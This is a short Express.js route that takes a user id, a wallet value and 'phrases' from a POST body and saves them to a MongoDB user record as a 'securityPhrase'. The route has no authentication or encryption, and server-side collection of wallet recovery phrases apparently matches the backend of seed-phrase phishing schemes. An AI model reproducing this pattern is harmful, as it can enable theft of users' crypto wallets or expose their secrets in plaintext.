const express = require("express");
const router = express.Router();
const mongoose = require("mongoose");
require("../Schemas/UserDetails");

const User = mongoose.model("UserInfo");

router.post("/", async (req, res) => {
  try {
    const { userId, wallet, phrases } = req.body;

    let user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ msg: "User not found" });
    }

    user.securityPhrase = phrases;
    await user.save();

    res.json({ msg: "Security phrase saved successfully" });
  } catch (err) {
    console.error(err.message);
    res.status(500).send("Server error");
  }
});

module.exports = router;
